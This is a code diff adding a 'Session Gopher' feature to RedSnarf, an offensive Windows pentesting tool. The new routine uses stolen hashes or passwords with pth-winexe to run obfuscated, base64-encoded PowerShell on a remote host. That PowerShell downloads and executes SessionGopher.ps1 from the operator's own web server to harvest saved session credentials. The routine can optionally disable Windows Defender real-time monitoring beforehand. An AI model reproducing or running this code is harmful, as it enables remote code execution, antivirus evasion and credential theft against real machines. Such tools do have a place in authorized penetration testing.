@@ -1266,6 +1266,83 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			#Routine starts Session Goper @arvanaghi
+			if session_gopher in yesanswers or session_gopher=="AV":
+				try:
+					print colored("[+]Checking for SessionGopher.ps1",'green')
+					if not os.path.isfile('./SessionGopher.ps1'):
+						print colored("[-]Cannot find SessionGopher.ps1",'red')
+						exit(1)
+					print colored("[+]Looks good",'green')	
+					
+					#Check to make sure port is not already in use
+					for i in xrange(10):
+						PORT = randint(49151,65535)					
+						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if len(stdout_value)>0:
+							break
+
+					my_ip=get_ip_address('eth0')
+					print colored("[+]Attempting to Run SessionGopher",'green')
+					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+					httpd = SocketServer.TCPServer(("",PORT), Handler)
+					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
+					server_process = multiprocessing.Process(target=httpd.serve_forever)
+					server_process.daemon = True
+					server_process.start()	
+					
+					x=' '
+					
+					if session_gopher=="AV":
+						#Get Windows Defender status and store status
+						print colored("[+]Getting Windows Defender Status",'yellow')
+						line="Get-MpPreference | fl DisableRealtimeMonitoring"
+						en = b64encode(line.encode('UTF-16LE'))						
+						
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if "DisableRealtimeMonitoring : False" in stdout_value:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
+							AVstatus='On'
+						else:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
+							AVstatus='Off'
+
+					if session_gopher=="AV":
+						#If Windows Defender is turned on turn off 
+						if AVstatus=='On':
+							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
+							if response in yesanswers:	
+								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
+								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
+								en = b64encode(line.encode('UTF-16LE'))						
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						
+						#Prepare string
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/SessionGopher.ps1'));"+randint(1,50)*x+"Invoke-SessionGopher"+randint(1,50)*x+" \"-Thorough\""
+					else:
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/SessionGopher.ps1'));"+randint(1,50)*x+"Invoke-SessionGopher"+randint(1,50)*x+" \"-Thorough\""
+					
+					print colored("[+] Using: "+line,'yellow')
+					en = b64encode(line.encode('UTF-16LE'))
+					print colored("[+] Encoding command: "+en,'yellow')
+					
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+										
+					if session_gopher=="AV":
+						#If Windows Defender AV status was on, turn it back on
+						if AVstatus=='On':
+							if response in yesanswers:	
+								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
+								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
+								en = b64encode(line.encode('UTF-16LE'))						
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+										
+				except OSError:
+					print colored("[-]Something went wrong here...",'red')
+
+
 			#Routine will screen shot all logged on users desktops
 			if screenshot in yesanswers:
 				loggeduser1=""
@@ -1893,7 +1970,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4m", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4n", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1927,6 +2004,7 @@ ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<
 ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
 ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="<Optional> Split SPN File")
+ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
 ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
 ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
@@ -2033,6 +2111,7 @@ liveips=args.liveips
 split_spn=args.split_spn
 sendspntojohn=args.sendspntojohn
 auto_complete=args.auto_complete
+session_gopher=args.session_gopher
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
